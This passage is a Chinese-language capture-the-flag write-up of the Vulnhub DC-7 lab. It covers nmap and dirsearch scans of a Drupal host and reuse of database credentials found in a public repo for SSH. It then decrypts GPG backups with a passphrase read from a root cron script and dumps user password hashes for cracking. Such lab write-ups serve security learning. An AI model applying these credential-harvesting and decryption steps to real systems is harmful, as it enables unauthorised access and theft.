{"pageProps":{"postData":{"id":"VulnhubDC-7","contentHtml":"<h1>DC-7</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-7,356/\">https://www.vulnhub.com/entry/dc-7,356/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>178</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                 \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 13:30 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00037</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00049</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-title function_ invoke__\">A0</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00037</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 13:31 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00040</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-title function_ invoke__\">A0</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>     \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 13:32 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00049</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.4</span>p1 Debian <span class=\"hljs-number\">10</span>+<span class=\"hljs-title function_ invoke__\">deb9u6</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">25</span> ((Debian))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-title function_ invoke__\">A0</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-c\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 13:33 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.178</span>\nHost is up (<span class=\"hljs-number\">0.00073</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.178\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.178:80/\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: user-login-form\n|     Form action: /user/login\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: user-login-form\n|     Form action: /user/login\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/password\n|     Form id: user-pass\n|     Form action: /user/password\n|     \n|     Path: http://192.168.75.178:80/user/password\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node/help\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node/\n|     Form id: search-form\n|     Form action: /search/node/\n|     \n|     Path: http://192.168.75.178:80/search/node/\n|     Form id: search-block-form\n|_    Form action: /search/node\n|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.\n| http-<span class=\"hljs-keyword\">enum</span>: \n|   /rss.xml: RSS or Atom feed\n|   /robots.txt: Robots file\n|   /INSTALL.txt: Drupal file\n|   /: Drupal version <span class=\"hljs-number\">8</span> \n|_  /README.txt: Interesting, a readme.\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问页面，发现是 <code>Drupal</code>CMS</p>\n<p><img src=\"/post-images/VulnhubDC-7/image36.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">\nWelcome to DC-<span class=\"hljs-number\">7</span>\nDC-<span class=\"hljs-number\">7</span> introduces some <span class=\"hljs-string\">\"new\"</span> concepts, but I<span class=\"hljs-string\">'ll leave you to figure out what they are.  :-)\nWhile this challenge isn'</span>t <span class=\"hljs-built_in\">all</span> that technical, <span class=\"hljs-keyword\">if</span> you need to resort to brute forcing <span class=\"hljs-keyword\">or</span> a dictionary attacks, you probably won<span class=\"hljs-string\">'t succeed.\nWhat you will have to do, is to think \"outside\" the box.\nWay \"outside\" the box.  :-)\n@DC7USER\n</span></code></pre>\n</li>\n<li>\n<p>爆破目录看看，好像没有什么实质性的东西</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">16</span>] Starting:                                                                                                                                                                                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">301</span> -  315B  - /core  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/core/            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">301</span> -  340B  - /forum/install/install.php  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/forum/install/core/install.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:02] <span class=\"hljs-number\">200</span> -    3KB - /index.php                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:06] <span class=\"hljs-number\">301</span> -  326B  - /install.php  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/core/install.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:06] <span class=\"hljs-number\">301</span> -  342B  - /install.php?profile=default  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/core/install.php?profile=default\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:07] <span class=\"hljs-number\">200</span> -  104B  - /INSTALL.txt                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">200</span> -    7KB - /LICENSE.txt                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">301</span> -  318B  - /modules  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/modules/      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">58</span>:03] <span class=\"hljs-number\">200</span> -    3KB - /node                                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">58</span>:04] <span class=\"hljs-number\">406</span> -   68B  - /node/<span class=\"hljs-number\">1</span>?_<span class=\"hljs-built_in\">format</span>=hal_json                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">301</span> -  319B  - /profiles  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/profiles/    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">200</span> -    2KB - /README.txt                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">200</span> -  584B  - /robots.txt                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">00</span>] <span class=\"hljs-number\">302</span> -  376B  - /search  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/search/node    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">00</span>] <span class=\"hljs-number\">302</span> -  376B  - /Search  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/search/node    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">301</span> -  316B  - /sites  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/sites/          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">200</span> -  309B  - /sites/README.txt                                 \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  317B  - /themes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/themes/        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">57</span>] <span class=\"hljs-number\">302</span> -  372B  - /user/  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/user/login      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">57</span>] <span class=\"hljs-number\">302</span> -  372B  - /user  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/user/login\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">59</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -    3KB - /user/login/                                      \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">19</span>] <span class=\"hljs-number\">200</span> -    4KB - /web.config                                       \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">301</span> -  335B  - /wp-admin/install.php  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/wp-admin/core/install.php\n</code></pre>\n</li>\n<li>\n<p>把目录翻了半天没找到可利用的，在<code>github</code>找了针对于<code>drupal</code>的工具尝试</p>\n<p><a href=\"https://github.com/immunIT/drupwn\">https://github.com/immunIT/drupwn</a></p>\n<pre><code class=\"hljs language-python\">        ____\n       / __ \\_______  ______ _      ______\n      / / / / ___/ / / / __ \\ | /| / / __ \\\n     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /\n    /_____/_/   \\__,_/ .___/|__/|__/_/ /_/\n                     /_/    \n[-] Version <span class=\"hljs-keyword\">not</span> specified, trying to identify it\n[+] Version detected: <span class=\"hljs-number\">8.0</span>                                                                                                                                                                                        \n============ Users ============\n[+]***** (<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span>)\n[+]***** (<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">2</span>)\n============ Default files ============\n[+] /README.txt (<span class=\"hljs-number\">200</span>)\n[+] /LICENSE.txt (<span class=\"hljs-number\">200</span>)\n[+] /robots.txt (<span class=\"hljs-number\">200</span>)\n[+] /web.config (<span class=\"hljs-number\">200</span>)\n[+] /update.php (<span class=\"hljs-number\">403</span>)\n[+] /install.php (<span class=\"hljs-number\">200</span>)\n============ Nodes ============\nhttp://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/node/<span class=\"hljs-number\">1</span>\nhttp://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/node/<span class=\"hljs-number\">3</span>\nhttp://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.178</span>/node/<span class=\"hljs-number\">2</span>\n</code></pre>\n<p>结果也没啥用就是了</p>\n</li>\n<li>\n<p>尝试弱口令，错误次数过多会被封禁</p>\n<pre><code class=\"hljs language-python\">Too many failed login attempts <span class=\"hljs-keyword\">from</span> your IP address. This IP address <span class=\"hljs-keyword\">is</span> temporarily blocked. Try again later <span class=\"hljs-keyword\">or</span> request a new password. \n</code></pre>\n</li>\n<li>\n<p>想起作者说的话，虽然它是<code>早期 DC 版本</code>（我不会告诉你哪一个）的一种逻辑进展，但其中涉及一些新概念，但你需要自己弄清楚。:-) 如果你需要诉诸暴力破解或字典攻击，你可能不会成功</p>\n<p>（而后我们尝试了暴力破解..）</p>\n<p>早期DC版本，<code>DC-1</code>也是<code>Drupal</code>但是版本都不一样，漏洞估计也被修复了</p>\n<p>没想法</p>\n</li>\n<li>\n<p>看了下dalao们的WP，发现转折点在，页面底下的**<code>@DC7USER</code>** ，我们在GitHub搜索能搜索到</p>\n<p><a href=\"https://github.com/Dc7User/staffdb\">https://github.com/Dc7User/staffdb</a></p>\n<p>是DC7的一些代码，下面还说</p>\n<pre><code class=\"hljs language-python\">This <span class=\"hljs-keyword\">is</span> some <span class=\"hljs-string\">\"code\"</span> (yes, it<span class=\"hljs-string\">'s not the greatest code, but that wasn'</span>t the point) <span class=\"hljs-keyword\">for</span> the DC-<span class=\"hljs-number\">7</span> challenge.\n\nThis isn<span class=\"hljs-string\">'t a flag, btw, but if you have made it here, well done anyway. :-)\n</span></code></pre>\n<p>不按套路出牌属实是。。。我们查看下数据库配置文件<code>config.php</code> ，获得数据库账号密码</p>\n<pre><code class=\"hljs language-python\">&#x3C;?php\n\t$servername = <span class=\"hljs-string\">\"localhost\"</span>;\n\t$username = <span class=\"hljs-string\">\"dc7user\"</span>;\n\t$password = <span class=\"hljs-string\">\"MdR3xOgB7#dW\"</span>;\n\t$dbname = <span class=\"hljs-string\">\"Staff\"</span>;\n\t$conn = mysqli_connect($servername, $username, $password, $dbname);\n?>\n</code></pre>\n<p>尝试后发现<code>ssh</code>可以登陆上去</p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">dc7user@dc-<span class=\"hljs-number\">7</span>:~$ whoami\ndc7user\ndc7user@dc-<span class=\"hljs-number\">7</span>:~$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1000</span>(dc7user) gid=<span class=\"hljs-number\">1000</span>(dc7user) groups=<span class=\"hljs-number\">1000</span>(dc7user),<span class=\"hljs-number\">24</span>(cdrom),<span class=\"hljs-number\">25</span>(floppy),<span class=\"hljs-number\">29</span>(audio),<span class=\"hljs-number\">30</span>(dip),<span class=\"hljs-number\">44</span>(video),<span class=\"hljs-number\">46</span>(plugdev),<span class=\"hljs-number\">108</span>(netdev)\ndc7user@dc-<span class=\"hljs-number\">7</span>:~$ uname -a\nLinux dc-<span class=\"hljs-number\">7</span> <span class=\"hljs-number\">4.9</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">9</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>查找敏感文件</p>\n<ul>\n<li>\n<p>在当前<code>home</code>目录下存在<code>mbox</code>文件，内容好像还是定期备份之类的</p>\n<pre><code class=\"hljs language-python\">From root@dc-<span class=\"hljs-number\">7</span> Fri Aug <span class=\"hljs-number\">30</span> 03:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">2019</span>\nReturn-path: &#x3C;root@dc-<span class=\"hljs-number\">7</span>>\nEnvelope-to: root@dc-<span class=\"hljs-number\">7</span>\nDelivery-date: Fri, <span class=\"hljs-number\">30</span> Aug <span class=\"hljs-number\">2019</span> 03:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">17</span> +<span class=\"hljs-number\">1000</span>\nReceived: <span class=\"hljs-keyword\">from</span> root by dc-<span class=\"hljs-number\">7</span> <span class=\"hljs-keyword\">with</span> local (Exim <span class=\"hljs-number\">4.89</span>)\n (envelope-<span class=\"hljs-keyword\">from</span> &#x3C;root@dc-<span class=\"hljs-number\">7</span>>)\n <span class=\"hljs-built_in\">id</span> 1i3O0y-0000Ed-To\n <span class=\"hljs-keyword\">for</span> root@dc-<span class=\"hljs-number\">7</span>; Fri, <span class=\"hljs-number\">30</span> Aug <span class=\"hljs-number\">2019</span> 03:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">17</span> +<span class=\"hljs-number\">1000</span>\nFrom: root@dc-<span class=\"hljs-number\">7</span> (Cron Daemon)\nTo: root@dc-<span class=\"hljs-number\">7</span>\nSubject: Cron &#x3C;root@dc-<span class=\"hljs-number\">7</span>> /opt/scripts/backups.sh\nMIME-Version: <span class=\"hljs-number\">1.0</span>\nContent-<span class=\"hljs-type\">Type</span>: text/plain; charset=UTF-<span class=\"hljs-number\">8</span>\nContent-Transfer-Encoding: 8bit\nX-Cron-Env: &#x3C;PATH=/<span class=\"hljs-built_in\">bin</span>:/usr/<span class=\"hljs-built_in\">bin</span>:/usr/local/<span class=\"hljs-built_in\">bin</span>:/sbin:/usr/sbin>\nX-Cron-Env: &#x3C;SHELL=/<span class=\"hljs-built_in\">bin</span>/sh>\nX-Cron-Env: &#x3C;HOME=/root>\nX-Cron-Env: &#x3C;LOGNAME=root>\nMessage-Id: &#x3C;E1i3O0y-0000Ed-To@dc-<span class=\"hljs-number\">7</span>>\nDate: Fri, <span class=\"hljs-number\">30</span> Aug <span class=\"hljs-number\">2019</span> 03:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">17</span> +<span class=\"hljs-number\">1000</span>\n\nrm: cannot remove <span class=\"hljs-string\">'/home/dc7user/backups/*'</span>: No such file <span class=\"hljs-keyword\">or</span> directory\nDatabase dump saved to /home/dc7user/backups/website.sql               [success]\n</code></pre>\n<p>可以知道脚本在<code>/opt/scripts/backups.sh</code></p>\n</li>\n<li>\n<p>并且当前目录下存在backups文件夹，里面是<code>website.sql .GPG</code> ，<code>website.tar.gz.gpg</code>（GPG是加密文件）</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看<code>/opt/scripts/backups.sh</code> 文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/bin/bash</span>\nrm /home/dc7user/backups/*\ncd /var/www/html/\ndrush sql-dump --result-file=/home/dc7user/backups/website.sql\ncd ..\ntar -czf /home/dc7user/backups/website.tar.gz html/\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz\nchown dc7user:dc7user /home/dc7user/backups/*\nrm /home/dc7user/backups/website.sql\nrm /home/dc7user/backups/website.tar.gz\n</code></pre>\n<pre><code class=\"hljs language-python\">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql \ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz\n</code></pre>\n<p><strong><code>--pinentry-mode loopback</code></strong>：指定 GPG 使用命令行模式获取密码，而不是弹出窗口</p>\n<p><strong><code>--passphrase PickYourOwnPassword</code></strong>：在此处直接提供密码（<code>PickYourOwnPassword</code>）</p>\n<p><strong><code>--symmetric</code></strong>：表示使用对称加密方法</p>\n<p>是进行对称加密，并且直接给出了密码<code>PickYourOwnPassword</code></p>\n</li>\n<li>\n<p>尝试解密，文件夹内两个文件都解密</p>\n<pre><code class=\"hljs language-python\">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg\ngpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.tar.gz --decrypt /home/dc7user/backups/website.tar.gz.gpg\n</code></pre>\n<p>同样让 GPG 从命令行读取密码，使用加密时使用的密码，破解成功，并且收到一封邮件</p>\n<pre><code class=\"hljs language-python\">dc7user@dc-<span class=\"hljs-number\">7</span>:/opt/scripts$ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg\ngpg: AES256 encrypted data\ngpg: encrypted <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1</span> passphrase\n\nYou have new mail <span class=\"hljs-keyword\">in</span> /var/mail/dc7user\n</code></pre>\n</li>\n<li>\n<p>我们先查看破解出来的文件，内容太多应该没用，返回去看邮件，像是之前<code>mbox</code>里的内容，然后再查看<code>website.tar.gz</code> ，解密后发现是整个<code>HTML</code> 的文件</p>\n<p>查看数据库配置文件<code>settings.php</code> ,其实在<code>/var/www</code>里面也能看（搞这么麻烦感觉走错路了）</p>\n<pre><code class=\"hljs language-python\">  <span class=\"hljs-string\">'username'</span> => <span class=\"hljs-string\">'db7user'</span>,\n  <span class=\"hljs-string\">'password'</span> => <span class=\"hljs-string\">'yNv3Po00'</span>,\n</code></pre>\n</li>\n<li>\n<p>登录数据库成功，查询有用的数据</p>\n<pre><code class=\"hljs language-python\">MariaDB [d7db]> select * <span class=\"hljs-keyword\">from</span> users;\n+-----+--------------------------------------+----------+\n| uid | uuid                                 | langcode |\n+-----+--------------------------------------+----------+\n|   <span class=\"hljs-number\">0</span> | e813638d-3eb3-<span class=\"hljs-number\">4212</span>-af40-171dd51023e9 | en       |\n|   <span class=\"hljs-number\">1</span> | fd93872d-a854-44cd-bb08-eb9a11e46492 | en       |\n|   <span class=\"hljs-number\">2</span> | 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a | en       |\n+-----+--------------------------------------+----------+\n//\nMariaDB [d7db]> select * <span class=\"hljs-keyword\">from</span> users_field_data;\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n| uid | langcode | preferred_langcode | preferred_admin_langcode | name    | <span class=\"hljs-keyword\">pass</span>                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n|   <span class=\"hljs-number\">0</span> | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      <span class=\"hljs-number\">0</span> | <span class=\"hljs-number\">1567054076</span> | <span class=\"hljs-number\">1567054076</span> |          <span class=\"hljs-number\">0</span> |          <span class=\"hljs-number\">0</span> | NULL              |                <span class=\"hljs-number\">1</span> |\n|   <span class=\"hljs-number\">1</span> | en       | en                 | NULL                     | admin   | $S$Ead.KmIcT/yfKC<span class=\"hljs-number\">.1</span>H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F | admin@example.com | Australia/Melbourne |      <span class=\"hljs-number\">1</span> | <span class=\"hljs-number\">1567054076</span> | <span class=\"hljs-number\">1567054076</span> | <span class=\"hljs-number\">1567098850</span> | <span class=\"hljs-number\">1567098643</span> | admin@example.com |                <span class=\"hljs-number\">1</span> |\n|   <span class=\"hljs-number\">2</span> | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      <span class=\"hljs-number\">1</span> | <span class=\"hljs-number\">1567057938</span> | <span class=\"hljs-number\">1567057938</span> |          <span class=\"hljs-number\">0</span> |          <span class=\"hljs-number\">0</span> | dc7user@blah.com  |                <span class=\"hljs-number\">1</span> |\n+-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+\n</code></pre>\n<p>尝试将<code>users_field_data</code> 表的数据放到<code>john</code>爆破，没破解出来，寻找别的线索</p>\n</li>\n<li>\n<p>仔细观察<code>backups.sh</code> 里面使用了<code>drush</code> 命令去读取数据库</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 帮助信息</span>\ndc7user@dc-<span class=\"hljs-number\">7</span>:/opt/scripts$ drush -h\nDrush provides an extensive <span class=\"hljs-built_in\">help</span> system that describes both drush commands <span class=\"hljs-keyword\">and</span> topics of general interest.  Use `drush <span class=\"hljs-built_in\">help</span> --<span class=\"hljs-built_in\">filter</span>` to present a <span class=\"hljs-built_in\">list</span> of command categories to view, <span class=\"hljs-keyword\">and</span> `drush topic` <span class=\"hljs-keyword\">for</span> a\n<span class=\"hljs-built_in\">list</span> of topics that go 